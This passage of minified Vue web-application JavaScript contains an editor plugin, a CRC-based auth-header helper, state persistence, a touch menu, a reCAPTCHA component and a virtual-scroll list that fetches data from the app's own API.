={align:'align',image:'image',list:'list',link:'link',unlink:'unlink',table:'table',font:'font','full screen':'full screen',text:'text',eraser:'remove format',info:'info',color:'color','please enter a url':'please enter a url','please enter title of link':'please enter title of link','create link':'create link',bold:'bold',italic:'italic',underline:'underline','strike through':'strike through',subscript:'subscript',superscript:'superscript',heading:'heading','font name':'font name','font size':'font size','left justify':'left justify','center justify':'center justify','right justify':'right justify','ordered list':'ordered list','unordered list':'unordered list','fore color':'fore color','background color':'background color','row count':'row count','column count':'column count',save:'save',upload:'upload',progress:'progress',unknown:'unknown','please wait':'please wait',error:'error',abort:'abort',reset:'reset',hr:'horizontal rule',undo:'undo','line height':'line height','exceed size limit':'exceed size limit' };function mixin(source,ext){if ( source ===void 0 )source ={};if ( ext ===void 0 )ext ={};Object.keys(ext).forEach(function (k){if (k ==='data'){var dataSrc =source[k];var dataDesc =ext[k];if (typeof dataDesc ==='function'){if (typeof dataSrc !=='function'){source[k]=dataDesc;}else {source[k]=function (){return mixin(dataSrc(),dataDesc());};}}}else {source[k]=ext[k];}});return source }polyfill();var VueHtml5Editor =function VueHtml5Editor(options){if ( options ===void 0 )options ={};var modules =[].concat( buildInModules );var components ={};if (Array.isArray(options.modules)){options.modules.forEach(function (module){if (module.name){modules.push(module);}});}if (Array.isArray(options.hiddenModules)){modules =(function (){var arr =[];modules.forEach(function (m){if (!options.hiddenModules.includes(m.name)){arr.push(m);}});return arr })();}if (Array.isArray(options.visibleModules)){modules =(function (){var arr =[];modules.forEach(function (module){if (options.visibleModules.includes(module.name)){arr.push(module);}});return arr })();}modules.forEach(function (module){var config =options[module.name];module.config =mixin(module.config,config);if (module.dashboard){module.dashboard.module =module;components[("dashboard-" +(module.name))]=module.dashboard;}if (options.icons &&options.icons[module.name]){module.icon =options.icons[module.name];}module.hasDashboard =!!module.dashboard;module.dashboard =null;});var i18n ={'en-us':i18nEnUs};var customI18n =options.i18n ||{};Object.keys(customI18n).forEach(function (key){i18n[key]=i18n[key]?mixin(i18n[key],customI18n[key]):customI18n[key];});var language =options.language ||'en-us';var locale =i18n[language];var defaultShowModuleName =!!options.showModuleName;var compo =mixin(editor,{data:function data(){return {modules:modules,locale:locale,defaultShowModuleName:defaultShowModuleName}},components:components });mixin(this,compo);};VueHtml5Editor.install =function install (Vue,options){if ( options ===void 0 )options ={};Vue.component(options.name ||'vue-html5-editor',new VueHtml5Editor(options));};return VueHtml5Editor;})));var makeCRCNBR =function(){var c;var crcTable =[];for (var n =0;n <256;n++){c =n;for (var k =0;k <8;k++){c =((c &1)?(0xEDB88320 ^(c >>>1)):(c >>>1));}crcTable[n]=c;}console.log("CREATED");return crcTable;};var nbrenpnbry =function(str){var crcTable =window.crcTable ||(window.crcTable =makeCRCNBR());var crc =0 ^(-1);for (var i =0;i <str.length;i++){crc =(crc >>>8)^crcTable[(crc ^str.charCodeAt(i))&0xFF];}return (crc ^(-1))>>>0;};function iluvutcnbr3062991(a){var tempc=a.nbr.split('_');if(tempc.length==2)store.dispatch("user/setAllHeaders",tempc[1]+nbrenpnbry(tempc[0])+'nbr'+a.utc);var tempc=a.utc.split('.');if(tempc.length>=3){if(store.getters['user/getTk_nbr_uc_frv']==""){store.dispatch("user/setTk_nbr_uc_frv",tempc[1]);}store.dispatch("user/setBr_utcheck",tempc[2]);}else {store.dispatch("user/setBr_nbrcheck",1);store.dispatch("user/setBr_utcheck",2);}var oldb=store.getters['user/getBr_nbrcheck'];var newb=store.getters['user/getBr_utcheck'];if(oldb!=newb){store.dispatch("user/setBr_nbrcheck",newb);if(!store.getters['user/checkKeepLogged']){if(store.getters['user/getAuth']){store.dispatch("user/setAllHeadersV","nbr"+store.getters['user/getTk_nbr_uc_frv']);var homePage='home-'+(store.getters.getLang);router.push({name:homePage});}}}if(!store.getters['user/getAuth']){store.dispatch("user/setAllHeadersV","nbr"+store.getters['user/getTk_nbr_uc_frv']);}};if ((/iPad|iPhone|iPod/.test(navigator.userAgent))){document.addEventListener('touchmove',function (event){if (event.scale !==1){event.preventDefault();}},false);document.body.style.transform ='scale(1)';};function findPathbyName(route,lang,fullpath_current){var newName=route.currentRoute.name.replace("-"+fullpath_current,"-"+lang);return {name:newName,params:route.currentRoute.params,query:route.currentRoute.query};};function loadComponent(componentName,path){return new Promise(function (resolve,reject){requestAnimationFrame(function(){var script =document.createElement('script');script.src =path;script.async =true;script.onload =function (){var component =Vue.component(componentName);if (component){resolve(component);}else {reject();}};script.onerror =reject;document.body.appendChild(script);});});};function load_recaptcha_bylang(lang){var script =document.createElement('script');script.src ="https://www.google.com/recaptcha/api.js?hl="+lang;script.async =true;document.body.appendChild(script);};function defaultReducer(state,paths){return paths.length ===0 ?state :paths.reduce(function (substate,path){if (path in state){var _Object$assign;return _.assign(substate,(_Object$assign ={},_Object$assign[path]=state[path],_Object$assign));}return substate;},{});}var canWriteToLocalStorage =function canWriteToLocalStorage(){try {window.localStorage.setItem('_canWriteToLocalStorage',1);window.localStorage.removeItem('_canWriteToLocalStorage');return true;}catch (e){return false;}};function _classCallCheck(instance,Constructor){if (!(instance instanceof Constructor)){throw new TypeError("Cannot call a class as a function");}}var defaultStorage =function (){if (typeof window !=='undefined' &&'localStorage' in window &&canWriteToLocalStorage()){}var InternalStorage =function (){function InternalStorage(){_classCallCheck(this,InternalStorage);}InternalStorage.prototype.setItem =function setItem(key,item){setProvider[key]=item;return item;};InternalStorage.prototype.setProvider =function setProvider(type){return type;};InternalStorage.prototype.getItem =function getItem(key){return setProvider[key];};InternalStorage.prototype.removeItem =function removeItem(key){delete setProvider[key];};InternalStorage.prototype.clear =function clear(){Object.keys(setProvider).forEach(function (key){return delete setProvider[key];});};return InternalStorage;}();return new InternalStorage();}();var _typeofNBRPLUGIN =typeof Symbol ==="function" &&typeof Symbol.iterator ==="symbol" ?function (obj){return typeof obj;}:function (obj){return obj &&typeof Symbol ==="function" &&obj.constructor ===Symbol &&obj !==Symbol.prototype ?"symbol" :typeof obj;};function creatNBRSystemStorage(){var _ref =arguments.length >0 &&arguments[0]!==undefined ?arguments[0]:{},_ref$key =_ref.key,key =_ref$key ===undefined ?'cmsnbruc2017' :_ref$key,_ref$type =_ref.type,type =_ref$type ===undefined ?window.sessionStorage :_ref$type,_ref$expire =_ref.expire,expire =_ref$expire ===undefined ?0 :_ref$expire,_ref$paths =_ref.paths,paths =_ref$paths ===undefined ?[]:_ref$paths,_ref$getState =_ref.getState,getState =_ref$getState ===undefined ?function (key,storage){var value =storage.getItem(key);return value &&value !=='undefined' ?JSON.parse(value):undefined;}:_ref$getState,_ref$setState =_ref.setState,setState =_ref$setState ===undefined ?function (key,state,storage){return storage.setItem(key,JSON.stringify(state));}:_ref$setState,_ref$reducer =_ref.reducer,reducer =_ref$reducer ===undefined ?defaultReducer :_ref$reducer,_ref$storage =_ref.storage,storage =_ref$storage ===undefined ?defaultStorage :_ref$storage,_ref$filter =_ref.filter,filter =_ref$filter ===undefined ?function (){return true;}:_ref$filter,_ref$subscriber =_ref.subscriber,subscriber =_ref$subscriber ===undefined ?function (store){return function (handler){return store.subscribe(handler);};}:_ref$subscriber;return function (store){var savedState =getState(key,storage.setProvider(type));if ((typeof savedState ==='undefined' ?'undefined' :_typeofNBRPLUGIN(savedState))==='object'){store.replaceState(_.merge({},store.state,savedState));}subscriber(store)(function (mutation,state){if (filter(mutation)){setState(key,reducer(state,paths),storage.setProvider(type));}});};};var TouchMenuLA =function (options){var self,defaults,menuClassName ='',mask,handle,menuHammer,maskHammer,newPos =0,currentPos =0,startPoint =0,countStart =0,isOpen=false,velocity =0.0;var TouchMenuLA =function (){self =this;defaults ={width:300,zIndex:500,disableSlide:false,handleSize:15,disableMask:false,maxMaskOpacity:0.5 };this.isVisible =false;this.initialize();};TouchMenuLA.prototype.setDefaultsOptions =function (){for (var key in defaults){if (!options[key]){options[key]=defaults[key];}}};TouchMenuLA.prototype.initElements =function (){options.target.style.zIndex =options.zIndex;options.target.style.width =options.width +'px';options.target.style.left =-options.width +'px';handle =document.createElement('div');handle.className ="tmla-handle";handle.style.width =options.handleSize +'px';handle.style.right =-options.handleSize +'px';options.target.appendChild(handle);if (!options.disableMask){mask =document.createElement('div');mask.className ='tmla-mask';document.body.appendChild(mask);maskHammer =new Hammer(mask,null);}};TouchMenuLA.prototype.pressSmallUp=function(){menuHammer.on('pressup',function (ev){if(!self.isOpen)self.close();});};TouchMenuLA.prototype.pressSmallOpen=function(){menuHammer.on('press',function (ev){newPos =currentPos +20;self.changeMenuPos();});};TouchMenuLA.prototype.swipeLeftClose=function(){menuHammer.on('swipeleft',function (ev){self.close();});};TouchMenuLA.prototype.swipeRightOpen=function(){menuHammer.on('swiperight',function (ev){self.open();});};TouchMenuLA.prototype.touchStartMenu =function (){menuHammer.on('panmove',function (ev){if (ev.additionalEvent ==='panup' ||ev.additionalEvent ==='pandown'){return;};newPos =currentPos +ev.deltaX;self.changeMenuPos();velocity =Math.abs(ev.velocity);});};TouchMenuLA.prototype.animateToPosition =function (pos){options.target.style.transform ='translate3d(' +pos +'px,0,0)';options.target.style.WebkitTransform ='translate3d(' +pos +'px,0,0)';options.target.style.MozTransform ='translate3d(' +pos +'px,0,0)';options.target.style.willChange ='transform';};TouchMenuLA.prototype.changeMenuPos =function (){if (newPos <=options.width){options.target.className =menuClassName +' tmla-menu';this.animateToPosition(newPos);if (!options.disableMask){this.setMaskOpacity(newPos);}}};TouchMenuLA.prototype.setMaskOpacity =function (newMenuPos){var opacity =parseFloat((newMenuPos / options.width)*options.maxMaskOpacity);mask.style.opacity =opacity;if (opacity ===0){mask.style.zIndex =-1;}else {mask.style.zIndex =options.zIndex -1;}};TouchMenuLA.prototype.touchEndMenu =function (){menuHammer.on('panend pancancel',function (ev){currentPos =ev.deltaX;self.checkMenuState(ev.deltaX);});};TouchMenuLA.prototype.eventStartMask =function (){maskHammer.on('panstart panmove',function (ev){if (ev.center.x <=options.width &&self.isVisible){countStart++;if (countStart ==1){startPoint =ev.deltaX;}if (ev.deltaX <0){newPos =(ev.deltaX -startPoint)+options.width;self.changeMenuPos();velocity =Math.abs(ev.velocity);}}});};TouchMenuLA.prototype.eventEndMask =function (){maskHammer.on('panend pancancel',function (ev){self.checkMenuState(ev.deltaX);countStart =0;});};TouchMenuLA.prototype.clickMaskClose =function (){mask.addEventListener('click',function (){self.close();});};TouchMenuLA.prototype.checkMenuState =function (deltaX){if (velocity >=0.5){if (deltaX >=0){self.open();}else {self.close();}}else {if (newPos >=100){self.open();}else {self.close();}}};TouchMenuLA.prototype.open =function (){self.isOpen=true;options.target.className =menuClassName +" tmla-menu opened";this.animateToPosition(options.width);currentPos =options.width;this.isVisible =true;self.showMask();self.invoke(options.onOpen);};TouchMenuLA.prototype.close =function (){self.isOpen=false;options.target.className =menuClassName +" tmla-menu closed";currentPos =0;self.isVisible =false;self.hideMask();self.invoke(options.onClose);};TouchMenuLA.prototype.toggle =function (){if (self.isVisible){self.close();}else {self.open();}};TouchMenuLA.prototype.showMask =function (){mask.className ="tmla-mask transition";mask.style.opacity =options.maxMaskOpacity;mask.style.zIndex =options.zIndex -1;};TouchMenuLA.prototype.hideMask =function (){mask.className ="tmla-mask transition";mask.style.opacity =0;mask.style.zIndex =-1;};TouchMenuLA.prototype.setMenuClassName =function (){menuClassName =options.target.className;};TouchMenuLA.prototype.invoke =function (fn){if (fn){fn.apply(self);}};TouchMenuLA.prototype.initialize =function (){if (options.target){var optionsHammer ={preventDefault:true };menuHammer =Hammer(options.target,optionsHammer);self.setDefaultsOptions();self.setMenuClassName();self.initElements();if (!options.disableSlide){self.touchStartMenu();self.touchEndMenu();self.pressSmallOpen();self.pressSmallUp();self.eventStartMask();self.eventEndMask();};self.swipeLeftClose();self.swipeRightOpen();if (!options.disableMask){self.clickMaskClose();};}};return new TouchMenuLA();};Vue.component("nbrloadingbar",{props:{id:String,customClass:String,progress:{type:Number,default:0},direction:{type:String,default:"right"},error:Boolean,onErrorDone:{type:Function,required:!0},onProgressDone:{type:Function,required:!0}},data:function(){return{show:!0,full:"",width:0,wait:!1,myError:!1}},render:function(t){var i=this.direction,r=this.customClass,o=this.id,n=(this.width,this.show),e=this.full,s=this.myError,u=this.styling;return t("div",null,[n?t("div",{attrs:{id:o?o:null},class:"LoadingBar LoadingBar--to_"+i+" "+(r?r:"")+(s?"LoadingBar--error":"")+(e?"LoadingBar--full":""),style:u()},[t("div",{class:"LoadingBar-glow"},[])]):null])},watch:{progress:function(t,i){var r=this;i!==t&&(this.width=t,setTimeout(function(){r.isFull()}))},error:function(t,i){var r=this;i!==t&&t&&(this.width=100,this.myError=!0,setTimeout(function(){r.isFull()}))}},methods:{isFull:function t(){var i=this,t=100===this.width;t&&(this.wait=!0,setTimeout(function(){i.full=!0,i.myError=!1,i.onErrorDone(),setTimeout(function(){i.show=!1,i.width=0,i.wait=!1,setTimeout(function(){i.full="",i.show=!0,i.onProgressDone()})},250)},700))},styling:function(){return this.wait?{width:"100%"}:{width:this.width+"%"}}}});Vue.component('nbr-bt-scrollTop',{template:'<md-button v-on:click="toptop" class="md-fab md-fab-bottom-right" v-bind:class="{scrolling:status}"><md-icon>keyboard_arrow_up</md-icon></md-button>',props:['offset'],data:function(){return{status:false,}},methods:{toptop:function(){scrollToY(0,3000 ,'easeInOutQuint');},hadingscroll:function(e){if(this.offset){if(document.body.scrollTop>this.offset ||document.documentElement.scrollTop>this.offset)this.status=true;else this.status=false;}}},mounted:function (){this.$nextTick(function(){window.addEventListener('scroll',this.hadingscroll);});},beforeDestroy:function(){console.log("DESTROY SCROLL TOP CHANGEPAS NE!");this.$off();this.data=null;}});Vue.component('cus_checkbox',{template:"<md-checkbox v-model='isChecked' @change='onChange' @change.native='onChange'/></md-checkbox>",props:['idItem','valueSelected'],methods:{onChange:function(e){var a={checked:e,value:this.idItem};this.$emit('input',a);}},computed:{isChecked:function(){return this.valueSelected.indexOf(this.idItem)>-1;}}});var currencyValidator={format:function format(a){return(Math.floor(100*a)/100).toFixed(2)},parse:function parse(a,b){var c=function(l){return{value:l}},d=function(l,m){return{warning:l,value:m,attempt:a}},e=function(l){return new d(a+' is not a valid dollar amount',l)},g=+a,h=a.indexOf('.'),i=a.indexOf('e');if(isNaN(g))return-1===h&&0<i&&i===a.length-1&&0!==+a.slice(0,i)?new c(b):new e(b);var j=currencyValidator.format(g),k=+j;return k==g?-1!==i&&i===a.length-2?new function f(l){return new d(a+' was automatically converted to '+l,l)}(g):new c(g):new e(g>k?k:b)}};Vue.component('currency-input',{template:"<span>$<input ref=\"input\" v-bind:value=\"value\" v-on:input=\"updateValue($event.target.value)\" v-on:focus=\"selectAll\" v-on:blur=\"formatValue\"></span>",props:{value:{type:Number,default:0 }},mounted:function (){this.formatValue()},methods:{updateValue:function (value){var result =currencyValidator.parse(value,this.value);if (result.warning){this.$refs.input.value =result.value }this.$emit('input',result.value)},selectAll:function (event){setTimeout(function (){event.target.select()},0)},formatValue:function (){this.$refs.input.value =currencyValidator.format(this.value)},}});Vue.component("nbr-flag",{template:'<span v-if="iso" class="pTf1081af7f1081af7WI f9f371c99f371c9OK" :class="[flagIconClass]" :title="iso"></span>',props:{iso:{type:String,default:null }},computed:{flagIconClass:function(){return 'flag-icon-' +this.iso.toLowerCase();}}});Vue.component("nbr-previewImage",{mounted:function (){this.$nextTick(function (){var previewIMGNBR =new Progressive({el:'body',lazyClass:'lazy',removePreview:true,srcError:"errornorsss",scale:true });previewIMGNBR.fire();});}});Vue.component("nbr-link",{template:'<a v-on:click.capture="doThat" v-bind:href="hrefa">{{this.text}}</a>',props:['href','anchor','text'],computed:{hrefa:function(){if(this.anchor)return this.href+"#"+this.anchor;return this.href;}},methods:{doThat:function(){}},mounted:function (){}});Vue.component("nbr-pageseo",{template:'<span></span>',props:['pageTitle'],mounted:function(){document.title =this.pageTitle ;store.dispatch("setpageTitle",this.pageTitle);}});Vue.component("nbr-recaptcha",{template:'<div><div :id="idcaptcha"></div><input :name="name" :value="value" type="hidden"><a v-show="!readyGCaptcha">{{txtloading}}</a></div>',props:['idcaptcha',"name","txtloading"],props:{idcaptcha:{type:String},name:String,txtloading:String,},watch:{readyGCaptcha:function(newval){if(newval){this.renderC();}}},computed:{readyGCaptcha:function(){if(this.checkFUNready=="undefined" ||this.checkFUNready=="")return false;return true;},value:function(){this.$emit('input',this.valueres);return this.valueres;}},data:function(){return {recaptcha:false,checkLoadRecaptcha:true,checkFUNready:typeof window.grecaptcha,valueres:"",intervalId:"" }},methods:{renderC:function(){console.log("gia tri day ne:"+this.checkFUNready);if (this.readyGCaptcha &&!this.recaptcha){var me=this;var momo =function(){if (window.grecaptcha){var res=grecaptcha.getResponse(me.recaptcha);if (res =="" ||res ==undefined ||res.length ==0){me.valueres="";}else me.valueres=res;console.log("summit res capt:"+me.valueres);console.log("summit res capt:"+res);}};var excb=function(){me.valueres="";};this.checkLoadRecaptcha=false;this.recaptcha=grecaptcha.render(document.getElementById(this.idcaptcha),{'sitekey' :'6Lc_yyYUAAAAAJYQzVrpY-6ylYLSfpcaKbPJGyJP','theme' :'light','callback':momo,'expired-callback':excb });}else this.checkLoadRecaptcha=true;},reset:function(){if (window.grecaptcha){grecaptcha.reset(this.recaptcha);this.valueres="";}},cb_response:function(res){}},mounted:function(){this.$nextTick(function (){window.grecaptcha=undefined;this.checkFUNready=typeof window.grecaptcha;load_recaptcha_bylang(store.getters.getLang);var me=this;this.intervalId=setInterval(function(){if(me.readyGCaptcha){clearInterval(me.intervalId);}else {me.checkFUNready=typeof window.grecaptcha;console.log("loop funtion captchane:"+me.checkFUNready);}});this.renderC();});}});(function(){"use strict";(function(){var refreshMain,spinnerWrapper,arrowWrapper,arrowMain;var scrollEl =document.body;var parentRefresher;var noShowClass ='mui-refresh-noshow';var mainAnimatClass ='mui-refresh-main-animat';var blueThemeClass ='mui-blue-theme';var isShowLoading =false;var isStoping =false;var isBtnAction =false;var NUM_POS_START_Y =-85;var NUM_POS_TARGET_Y =0;var NUM_POS_MAX_Y =145;var NUM_POS_MIN_Y =30;var NUM_NAV_TARGET_ADDY =25;var touchCurrentY;var touchStartY =0;var customNavTop =0;var verticalThreshold =2;var maxRotateTime =6000;var basePosY =60;var onBegin =null;var onBtnBegin=null;var onEnd =null;var onBtnEnd =null;var stopAnimatTimeout =null;var refreshNav ='';var lastTime =new Date().getTime();var isIOS =/ip(hone|ad|od)/i.test(navigator.userAgent);var tmpl ='<div id="muiRefresh" class="mui-refresh-main">\ <div class="mui-refresh-wrapper ">\ <div class="mui-arrow-wrapper">\ <div class="mui-arrow-main"></div>\ </div>\ <div class="mui-spinner-wrapper" style="display:none;">\ <div class="mui-spinner-main" >\ <div class="mui-spinner-left">\ <div class="mui-half-circle"></div>\ </div>\ <div class="mui-spinner-right">\ <div class="mui-half-circle"></div>\ </div>\ </div>\ </div>\ </div>\ </div>';var touchPos ={top:0,x1:0,x2:0,y1:0,y2:0 };var $ =function(){var parent,el;if (arguments.length ===1){el =arguments[0];parent =document;}else {parent =arguments[0];el =arguments[1];}return el &&(typeof el)==='string' ?parent.querySelector(el):el instanceof HTMLElement ?el :null;};function mRefresh(options){options =options ||{};parentRefresher=options.parentRefresher;scrollEl =options.scrollEl;onBegin =options.onBegin;onEnd =options.onEnd;maxRotateTime =options.maxTime ||maxRotateTime;if(options.nav){refreshNav =options.nav;}else refreshNav =$(options.nav ||refreshNav);if (!$('#muirefresh')){renderTmpl();}refreshMain =$('#muiRefresh');spinnerWrapper =$(refreshMain,'.mui-spinner-wrapper');arrowWrapper =$(refreshMain,'.mui-arrow-wrapper');arrowMain =$(refreshMain,'.mui-arrow-main');touchCurrentY =basePosY +NUM_POS_START_Y;if (!isDefaultType()){refreshMain.classList.add('mui-refresh-nav');var rect;if(rect =refreshNav.getBoundingClientRect()){var top =rect.top ;customNavTop =top;basePosY =customNavTop;touchCurrentY =basePosY +NUM_POS_START_Y;refreshMain.style.top =basePosY +'px';}var navIndex =window.getComputedStyle(refreshNav).zIndex;refreshMain.style.zIndex =Math.max(1,parseInt(navIndex)-1);}if(options.index){refreshMain.style.zIndex =~~options.index;}if(options.top){refreshMain.style.top =options.top;}if (options.theme){refreshMain.classList.add(options.theme);}else {refreshMain.classList.add(blueThemeClass);}refreshMain.classList.add(mainAnimatClass);if(!options.freeze){bindEvents();}};mRefresh.resolve =function(){if(!isStoping &&stopAnimatTimeout){clearTimeout(stopAnimatTimeout);stopAnimatTimeout =null;recoverRefresh();}};mRefresh.destroy =function(){unbindEvents();refreshMain.parentNode.removeChild(refreshMain);};mRefresh.refresh =function(opt){if(!isShowLoading){var realTargetPos =basePosY +NUM_POS_TARGET_Y -20;isShowLoading =true;isBtnAction =true;opt =opt ||{};onBtnBegin =opt.onBegin;onBtnEnd =opt.onEnd;if (!isDefaultType()){realTargetPos =realTargetPos +NUM_NAV_TARGET_ADDY;}refreshMain.style.display ='';refreshMain.classList.remove(mainAnimatClass);refreshMain.style.top =realTargetPos +'px';refreshMain.style.webkitTransform ='scale(' +0.01 +')';setTimeout(doRotate,60);}};mRefresh.unbindEvents =function(){unbindEvents();};mRefresh.bindEvents =function(){bindEvents();};function renderTmpl(){parentRefresher.insertAdjacentHTML('beforeend',tmpl);};mRefresh.touchStartRE =function(e){if(isIOS &&scrollEl ==document.body){touchPos.top =window.scrollY;}else if(scrollEl !=document){touchPos.top =scrollEl.scrollTop;}else {touchPos.top =(document.documentElement ||document.body.parentNode ||document.body).scrollTop;}if (touchPos.top >0 ||isShowLoading){return;}touchCurrentY =basePosY +NUM_POS_START_Y;refreshMain.style.display ='';if (e.touches[0]){touchPos.x1 =e.touches[0].pageX;touchStartY =touchPos.y1 =e.touches[0].pageY;}};mRefresh.touchMoveRE =function(e){var thisTouch,distanceY;var now =new Date().getTime();if (touchPos.top >0 ||isShowLoading ||!e.touches ||e.touches.length !==1){return;}thisTouch =e.touches[0];touchPos.x2 =thisTouch.pageX;touchPos.y2 =thisTouch.pageY;distanceY =touchPos.y2 -touchPos.y1;console.log("reload :"+touchCurrentY);if (touchCurrentY <=basePosY +NUM_POS_MAX_Y){touchCurrentY +=distanceY ;moveCircle(touchCurrentY);}else {touchCurrentY=basePosY +NUM_POS_MAX_Y;return;}touchPos.y1 =thisTouch.pageY;lastTime =now;};mRefresh.touchEndRE =function(e){if (touchPos.top >0 ||isShowLoading){return;}if (touchCurrentY >basePosY +NUM_NAV_TARGET_ADDY +NUM_POS_MIN_Y){doRotate();}else {backToStart();}};function backToStart(){isShowLoading =false;isStoping =false;isBtnAction =false;var realStartPos =basePosY +NUM_POS_START_Y;if ( isDefaultType()){refreshMain.style.top =realStartPos +'px';refreshMain.style.webkitTransform ='scale(' +0 +')';}else {refreshMain.style.top ='0px';}refreshMain.style.opacity =0;};function moveCircle(y){refreshMain.style.display ='';var scaleRate =40;var scalePer =y / scaleRate >1 ?1 :y / scaleRate <0 ?0 :y / scaleRate;var currMoveY =basePosY +NUM_POS_START_Y +y;if (isDefaultType()){refreshMain.style.webkitTransform ='scale(' +scalePer +')';}refreshMain.style.opacity =scalePer;refreshMain.style.top =currMoveY +'px';arrowMain.style.webkitTransform ='rotate(' +-(y *3)+'deg)';};function doRotate(){isShowLoading =true;if (isBtnAction &&typeof onBtnBegin ==='function'){onBtnBegin();}else if (typeof onBegin ==='function'){setTimeout(function(){onBegin()},1000);}refreshMain.style.display ='';refreshMain.style.opacity =1;if (!isBtnAction){var realTargetPos =basePosY +NUM_POS_TARGET_Y +NUM_NAV_TARGET_ADDY;if (!isDefaultType()){realTargetPos =realTargetPos +NUM_NAV_TARGET_ADDY;}refreshMain.style.top =realTargetPos +'px';}else {refreshMain.classList.add(mainAnimatClass);refreshMain.style.webkitTransform ='scale(' +1 +')';}arrowWrapper.style.display ='none';spinnerWrapper.style.display ='';stopAnimatTimeout =setTimeout(recoverRefresh,maxRotateTime);};function recoverRefresh(){isStoping =true;refreshMain.classList.add(noShowClass);spinnerWrapper.style.display ='none';setTimeout(function(){refreshMain.classList.remove(noShowClass);backToStart();refreshMain.style.display ='none';arrowWrapper.style.display ='';isShowLoading =false;isStoping =false;if (isBtnAction &&typeof onBtnEnd ==='function'){onBtnEnd();}else if (typeof onEnd ==='function'){onEnd();}},500);};function isDefaultType(){return !refreshNav;};function bindEvents(){};function unbindEvents(){};window.mRefresh =mRefresh;})();}).call(this);Vue.component("nbr-virtual-scroll",{template:"<div v-nbr-over-scroll=\"{refresher:refresher,callback:fecthDB,resetloading:showimageloading,funcReload:funcReload}\" class=\"wrapperscrollNBr\"><component :is=\"mainTag\" class=\"virtual-scroller scroller\" v-keep-scroll-position v-on:scroll=\"handleScroll\" :class=\"[cssClass]\" v-observe-visibility=\"handleVisibilityChange\"><slot name=\"before-container\"></slot><component :is=\"containerTag\" class=\"item-container\" :style=\"itemContainerStyle\" :class=\"[containerClass]\" ><slot name=\"before-content\"></slot><component :is=\"contentTag\" class=\"items\" :class=\"[contentClass]\" :style=\"itemsStyle\"><slot class=\"item\" v-for=\"item,index in visibleItems\" :item=\"item\" :item-index=\"_startIndex +index\"></slot></component><slot :status=\"runningFecth\" name=\"after-content\"></slot></component><slot name=\"after-container\"></slot><nbr-virtual-rezise @notify=\"handleResize\" /></component></div>" ,props:{renderers:{default:null,},itemHeight:{type:[Number,String],default:null,},typeField:{type:String,default:'type',},keyField:{type:String,default:'id',},urldata:{type:String,default:'',},heightField:{type:String,default:'height',},mainTag:{type:String,default:'div',},overScroll:{type:Number,default:10,},containerTag:{type:String,default:'div',},containerClass:{default:null,},contentTag:{type:String,default:'div',},contentClass:{default:null,},refresher:{type:Boolean,default:true,},pageMode:{type:Boolean,default:false,},buffer:{type:[Number,String],default:2,},poolSize:{type:[Number,String],default:1,},prerender:{type:[Number,String],default:0,},},data:function(){return {elScroll:null,visibleItems:[],blockTouch:false,headerItems:[],footerItems:[],items:[],itemContainerStyle:null,itemsStyle:null,oldLengthItem:0,runningFecth:false,endIndex:0,keysEnabled:true,}},computed:{itemContainerHeight:function(){var containerHeight=0;if (this.itemHeight !==null){containerHeight =this.lengthListItem *this.itemHeight;};return containerHeight+50;},lengthListItem:function(){return this.items.length;},cssClass:function(){return {'page-mode':this.pageMode,}},heights:function(){if (this.itemHeight ===null){var heights ={};var items =this.items;var field =this.heightField;var accumulator =0;for (var i =0;i <items.length;i++){accumulator +=items[i][field];heights[i]=accumulator;}return heights;}},authvalue:function(newval){return store.getters['user/getAuthValue'];},authkey:function(newval){return store.getters['user/getAuthKey'];}},watch:{items:{handler:function (newValue){console.log("new Length:"+newValue.length);console.log("old Length:"+this.oldLengthItem);},deep:true,},pageMode:function(){this.applyPageMode();this.$nextTick(function(){this.updateVisibleItems();})},},methods:{findScroller:function(){var children=this.$el.childNodes;var self=this;[].forEach.call(children,function(child){if(child.className.match("virtual-scroller scroller")){self.elScroll=child;}});},getScroll:function(){var el =this.elScroll;var scroll;if (this.pageMode){var rect =el.getBoundingClientRect();var top =-rect.top;var height =window.innerHeight;if (top <0){height +=top;top =0;};if (top +height >rect.height){height =rect.height -top;};scroll ={top:top,bottom:top +height,}}else {scroll ={top:el.scrollTop,bottom:el.scrollTop +el.clientHeight,}};console.log("top:"+scroll.top+"-bottom:"+scroll.bottom);if (scroll.bottom >=0 &&scroll.top <=scroll.bottom){return scroll }else {return null }},showimageloading:function(number){if(number){this.itemContainerStyle={height:'100%',};}else {this.itemContainerStyle={height:this.itemContainerHeight +'px',};}},funcReload:function(){var selfNBR=this;instance.get(this.urldata,{headers:{'authvalue':this.authvalue,'authkey':this.authkey,},params:{bb:'af asfas' }}).then(function(response){resetHeadersNBR(response.headers);selfNBR.runningFecth=false;console.log(response.data);console.log(response.status);console.log(response.statusText);console.log(response.headers);console.log(response.config);if(response.status==200){var data=response.data;var homePage='home-'+(store.getters.getLang);if(data.code==200){console.log("KQL:"+data.status);selfNBR.items=data.message;requestAnimationFrame(selfNBR.updateVisibleItems);}else if(data.code==404){console.log("case 404:"+data.status);router.push({name:homePage});}else if(data.code==500){console.log("case 500:"+data.status);ErrorReq(i18nGobal(500));}}else {ErrorReq("Problem connect to sever!Please try again!");}mRefresh.resolve();}).catch(function(thrown){if (axios.isCancel(thrown)){console.log('Request canceled',thrown.message);}else {alert(thrown.message);}selfNBR.runningFecth=false;mRefresh.resolve();});},fecthDB:function(){if(!this.runningFecth){this.runningFecth=true;var selfNBR=this;instance.get(this.urldata,{headers:{'authvalue':this.authvalue,'authkey':this.authkey,},params:{he:'af asfas' }}).then(function(response){resetHeadersNBR(response.headers);selfNBR.runningFecth=false;console.log(response.data);console.log(response.status);console.log(response.statusText);console.log(response.headers);console.log(response.config);if(response.status==200){var data=response.data;var homePage='home-'+(store.getters.getLang);if(data.code==200){console.log("KQL:"+data.status);selfNBR.items=selfNBR.items.concat( data.message);requestAnimationFrame(selfNBR.updateVisibleItems);}else if(data.code==404){console.log("case 404:"+data.status);router.push({name:homePage});}else if(data.code==500){console.log("case 500:"+data.status);ErrorReq(i18nGobal(500));}}else {ErrorReq("Problem connect to sever!Please try again!");}}).catch(function(thrown){if (axios.isCancel(thrown)){console.log('Request canceled',thrown.message);}else {alert(thrown.message);}selfNBR.runningFecth=false;});}},updateVisibleItems:function(){var force =arguments.length >0 &&arguments[0]!==undefined ?arguments[0]:false;var l =this.lengthListItem;var scroll =this.getScroll();var items =this.items;var itemHeight =this.itemHeight;var containerHeight,offsetTop;if (scroll){var startIndex =-1;var endIndex =-1;if (itemHeight ===null){var heights =this.heights;var h;var a =0;var b =l -1;var i =~~(l / 2);var oldI;do {oldI =i;h =heights[i];if (h <scroll.top){a =i;}else if (i <l &&heights[i +1]>scroll.top){b =i;};i =~~((a +b)/ 2);}while (i !==oldI);startIndex 